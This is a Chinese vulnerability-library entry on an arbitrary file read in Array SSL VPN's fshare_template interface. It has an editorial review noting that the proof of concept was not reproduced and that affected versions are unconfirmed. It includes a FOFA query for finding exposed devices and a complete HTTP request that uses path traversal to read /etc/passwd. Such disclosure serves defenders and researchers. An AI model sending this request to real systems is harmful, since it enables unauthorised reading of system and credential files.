---
source: "wy876 漏洞文库"
id: "vw-21b7ca4d73531abbb16d5486"
entity_id: "ve-21b7ca4d73531abbb16d5486"
schema_version: "1"
title: "Array VPN存在任意文件读取漏洞"
product: "Array SSL VPN"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无版本；X_AN_FILESHARE使用占位账号及flags，鉴权机制未说明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Array%20Networks/ArrayVPN%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gxbmavs2hmreimvi"
source_status: "recorded"
---

# Array VPN存在任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Array SSL VPN
- 本文讨论：fshare_template路径遍历/文件读取
- 版本、权限与配置前提：无版本；X_AN_FILESHARE使用占位账号及flags，鉴权机制未说明
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅产品名充当影响版本
- 无响应、厂商公告、CVE映射或鉴权前提说明
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 是否属于CVE-2023-28461及受影响AG/vxAG版本待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Array SSL VPN远程安全接入软件具备远程安全接入网关的全部功能，可以在虚拟化或云环境中提供专业的远程安全访问；它帮助用户实现在任何时间任何地点使用任何设备都可以安全地连接到云上的主机或应用。Array的 fshare_template 接口存在任意文件读取漏洞

# 二、影响版本
+ Array VPN

# 三、资产测绘
+ fofa`product="Array-VPN"`
+ 特征


# 四、漏洞复现
```http
GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
Dnt: 1
Upgrade-Insecure-Requests: 1
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gxbmavs2hmreimvi>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
